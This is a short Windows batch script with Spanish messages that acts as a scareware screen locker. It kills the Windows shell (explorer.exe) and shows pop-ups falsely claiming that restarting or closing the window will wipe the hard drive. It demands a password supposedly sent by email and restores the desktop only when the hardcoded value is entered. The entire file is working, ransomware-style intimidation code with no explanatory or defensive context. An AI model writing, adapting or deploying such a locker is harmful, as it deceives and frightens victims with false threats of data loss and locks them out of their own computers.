@echo off
color 0A
title POR ENTRAR
taskkill /f /im explorer.exe
cls
msg * LEE CON ATENCION!.
msg * NO REINICIAR EL ORDENADOR!.
msg * AL REINICIAR SE ELIMINARA LOS DATOS DEL DISCO DURO!.
msg * TENGA CUIDADO! NO VAYA A CERRAR LA VENTANA DE ARRIBA.
msg * SI CIERRA LA VENTANA! NO PODRA RECUPERAR SU ORDENADOR!.
echo ========================================
echo SI USTED CIERRA ESTA VENTANA! NO PODRA RECUPERAR SU ORDENADOR!.
echo ========================================
echo Ingresar el password que recibio por correo.
:bucle
set /p ahorasi=Escribe el password:
if %ahorasi%==221321213 (goto passcorrecto) ELSE (goto bucle)
:passcorrecto
echo Felicidades! El password es correcto.
start explorer.exe
pause > nul
exit